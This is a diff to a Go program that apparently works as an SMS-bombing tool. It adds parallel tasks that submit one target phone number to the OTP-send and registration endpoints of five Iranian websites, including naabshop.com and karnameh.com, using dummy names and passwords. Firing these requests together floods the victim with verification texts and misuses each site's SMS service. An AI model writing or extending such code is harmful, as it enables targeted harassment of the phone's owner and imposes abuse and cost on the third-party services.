@@ -685,6 +685,98 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+
+                // naabshop.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98")
+				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) 
+				formData.Set("action_type", "phone")
+				formData.Set("digits_reg_name", "testname") 
+				formData.Set("digits_reg_lastname", "testlastname") 
+				formData.Set("digits_process_register", "1")
+				formData.Set("sms_otp", "")
+				formData.Set("otp_step_1", "1")
+				formData.Set("signup_otp_mode", "1")
+				formData.Set("rememberme", "1")
+				formData.Set("digits", "1")
+				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") 
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "login")
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
+				formData.Set("digits_form", "28e10ee7bd")
+				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
+				formData.Set("show_force_title", "1")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+
+				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+		//karnameh.com
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": phone,
+				}
+				sendJSONRequest(c, ctx, "https://api-gw.karnameh.com/switch/api/auth/otp/send/", payload, &wg, ch)
+			}
+		}(client)
+		// afrak.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"first_name": "تست نام", //ی
+					"phone_number": phone, 
+					"password": "testpassword123", 
+					"code": "",
+					"invite_id": "",
+					"rules": true,
+				}
+				sendJSONRequest(c, ctx, "https://client.afrak.com/api/v1/pre-register", payload, &wg, ch)
+			}
+		}(client)
+		//masterkala.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
+				payload := map[string]interface{}{
+					"type": "sendotp",
+					"phone": phone,
+				}
+				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
+			}
+		}(client)
+		//iranous.com
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				serviceURL := "https://iranous.com/login?back=my-account"
+				formData := url.Values{}
+				formData.Set("back", "my-account") 
+				formData.Set("username", phone) 
+				formData.Set("id_customer", "")
+				formData.Set("firstname", "testfirstname") 
+				formData.Set("lastname", "testlastname") 
+				formData.Set("password", "testpassword123") 
+				formData.Set("action", "register") 
+				formData.Set("ajax", "1")
+
+				sendFormRequest(c, ctx, serviceURL, formData, &wg, ch)
+			}
+		}(client)
 		// oldpanel.avalpardakht.com 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
